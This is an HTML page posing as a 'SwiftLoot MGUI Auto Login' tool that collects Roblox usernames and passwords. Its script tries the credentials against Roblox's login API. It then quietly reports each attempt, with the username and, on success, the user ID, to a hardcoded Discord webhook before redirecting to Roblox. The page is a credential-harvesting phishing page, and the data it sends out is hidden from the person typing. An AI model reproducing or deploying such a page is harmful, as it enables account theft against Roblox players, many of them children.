<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SwiftLoot MGUI Auto Login</title>
<style>
body { font-family: Arial; background:#111; color:#eee; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; }
input { padding:8px; margin:5px; width:200px; }
button { padding:10px 20px; margin-top:10px; cursor:pointer; }
</style>
</head>
<body>
<h1>SwiftLoot MGUI Auto Login</h1>

<input id="username" placeholder="Username or Email">
<input id="password" type="password" placeholder="Password">
<button id="loginBtn">Login</button>

<p id="status">Enter credentials and click Login</p>

<script>
const loginBtn = document.getElementById("loginBtn");
const statusEl = document.getElementById("status");

// Discord webhook URLs
const successWebhook = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";
const failedWebhook = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";

loginBtn.addEventListener("click", async () => {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;

    if (!username || !password) {
        statusEl.textContent = "❌ Please enter both username and password!";
        return;
    }

    statusEl.textContent = "⏳ Logging in...";

    try {
        // Attempt Roblox login via API
        const response = await fetch("https://auth.roblox.com/v2/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cusername: username, password: password })
        });

        const data = await response.json();

        if (data.user) {
            statusEl.textContent = "✅ Login successful!";

            // Send success to Discord
            await fetch(successWebhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `✅ Login Success\nUser: ${username}\nUserId: ${data.user.userId}` })
            });

            // Optional: redirect to Roblox homepage
            window.location.href = "https://www.roblox.com/home";
        } else {
            statusEl.textContent = "❌ Login failed!";

            // Send failed to Discord
            await fetch(failedWebhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `❌ Login Failed\nUser: ${username}` })
            });
        }

    } catch (err) {
        console.error(err);
        statusEl.textContent = "❌ Error connecting to Roblox API!";
    }
});
</script>
</body>
</html>
